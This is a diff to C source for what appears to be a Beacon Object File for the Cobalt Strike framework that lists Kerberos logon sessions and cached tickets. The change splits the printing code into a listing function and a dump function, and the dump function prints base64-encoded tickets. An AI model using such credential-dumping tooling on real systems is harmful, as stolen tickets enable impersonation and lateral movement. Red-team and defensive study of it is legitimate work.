@@ -54,6 +54,7 @@ void execute_klist(HANDLE hToken, LUID luid, BOOL currentLuid, BOOL dump) {
          WCHAR* sid = NULL;
          ADVAPI32$ConvertSidToStringSidW(sessionData.sessionData[i]->Sid, &sid);
          SYSTEMTIME logon_utc = ConvertToSystemtime(sessionData.sessionData[i]->LogonTime);
+
          BeaconPrintf(CALLBACK_OUTPUT,
 	     "\nUsername             : %s\n" 
 	     "Domain               : %s\n"
@@ -74,13 +75,12 @@ void execute_klist(HANDLE hToken, LUID luid, BOOL currentLuid, BOOL dump) {
 	     GetNarrowStringFromUnicode(sessionData.sessionData[i]->DnsDomainName),
 	     GetNarrowStringFromUnicode(sessionData.sessionData[i]->Upn)
 	     );
-//        PRINT(dispatch, "\n");
+
         if (highIntegrity) {
             cacheRequest.LogonId = sessionData.sessionData[i]->LogonId;
         } else {
             cacheRequest.LogonId = (LUID){.HighPart = 0, .LowPart = 0};
         }
-//        cacheRequest.LogonId = (LUID){.HighPart = 0, .LowPart =0};
 
         SECUR32$LsaFreeReturnBuffer(sessionData.sessionData[i]);
         KERB_QUERY_TKT_CACHE_EX_RESPONSE* cacheResponse = NULL;
@@ -117,12 +117,13 @@ void execute_klist(HANDLE hToken, LUID luid, BOOL currentLuid, BOOL dump) {
                                 continue;
                             }
                             Base64encode(encoded, ticket, ticketSize);
-	                    PrintTicketInfo(cacheInfo, encoded);
+	                        PrintTicketInfoDump(cacheInfo, encoded);
                             MSVCRT$free(encoded);
                             MSVCRT$free(ticket);
                         }
                     }
                 }
+                PrintTicketInfoKlist(cacheInfo);
             }
         }
         SECUR32$LsaFreeReturnBuffer(cacheResponse);
@@ -209,13 +210,35 @@ const char* PrintTicketFlags(ULONG ticketFlags) {
 //    BeaconPrintf(CALLBACK_OUTPUT, "Flags: %s\n", outputFlags);
 }
 
-void PrintTicketInfo(KERB_TICKET_CACHE_INFO_EX cacheInfo, CHAR* encoded) {
+void PrintTicketInfoKlist(KERB_TICKET_CACHE_INFO_EX cacheInfo) {
     SYSTEMTIME st_utc = ConvertToSystemtime(cacheInfo.StartTime);
     SYSTEMTIME end_utc = ConvertToSystemtime(cacheInfo.EndTime);
     SYSTEMTIME renew_utc = ConvertToSystemtime(cacheInfo.RenewTime);
     char* GetEncryptionTypeString(long encType);
     BeaconPrintf(CALLBACK_OUTPUT,
-        "\n\tClient Name     : %s @ %s\n"
+    "\n\tClient Name     : %s @ %s\n"
+	"\tServer Name     : %s @ %s\n" 
+	"\tStart Time      : %d/%d/%d %d:%d:%d (UTC)\n"
+	"\tEnd Time        : %d/%d/%d %d:%d:%d (UTC)\n"
+	"\tRenew Time      : %d/%d/%d %d:%d:%d (UTC)\n"
+	"\tFlags           :%s\n"
+	"\tEncryption Type : %li\n",
+	GetNarrowStringFromUnicode(cacheInfo.ClientName), GetNarrowStringFromUnicode(cacheInfo.ClientRealm), 
+	GetNarrowStringFromUnicode(cacheInfo.ServerName), GetNarrowStringFromUnicode(cacheInfo.ServerRealm),
+	st_utc.wMonth, st_utc.wDay, st_utc.wYear, st_utc.wHour, st_utc.wMinute, st_utc.wSecond,
+	end_utc.wMonth, end_utc.wDay, end_utc.wYear, end_utc.wHour, end_utc.wMinute, end_utc.wSecond,
+	renew_utc.wMonth, renew_utc.wDay, renew_utc.wYear, renew_utc.wHour, renew_utc.wMinute, renew_utc.wSecond,
+    PrintTicketFlags(cacheInfo.TicketFlags),
+	cacheInfo.EncryptionType);
+}
+
+void PrintTicketInfoDump(KERB_TICKET_CACHE_INFO_EX cacheInfo, CHAR* encoded) {
+    SYSTEMTIME st_utc = ConvertToSystemtime(cacheInfo.StartTime);
+    SYSTEMTIME end_utc = ConvertToSystemtime(cacheInfo.EndTime);
+    SYSTEMTIME renew_utc = ConvertToSystemtime(cacheInfo.RenewTime);
+    char* GetEncryptionTypeString(long encType);
+    BeaconPrintf(CALLBACK_OUTPUT,
+    "\n\tClient Name     : %s @ %s\n"
 	"\tServer Name     : %s @ %s\n" 
 	"\tStart Time      : %d/%d/%d %d:%d:%d (UTC)\n"
 	"\tEnd Time        : %d/%d/%d %d:%d:%d (UTC)\n"
@@ -228,7 +251,7 @@ void PrintTicketInfo(KERB_TICKET_CACHE_INFO_EX cacheInfo, CHAR* encoded) {
 	st_utc.wMonth, st_utc.wDay, st_utc.wYear, st_utc.wHour, st_utc.wMinute, st_utc.wSecond,
 	end_utc.wMonth, end_utc.wDay, end_utc.wYear, end_utc.wHour, end_utc.wMinute, end_utc.wSecond,
 	renew_utc.wMonth, renew_utc.wDay, renew_utc.wYear, renew_utc.wHour, renew_utc.wMinute, renew_utc.wSecond,
-        PrintTicketFlags(cacheInfo.TicketFlags),
+    PrintTicketFlags(cacheInfo.TicketFlags),
 	cacheInfo.EncryptionType,
 	encoded);
 }
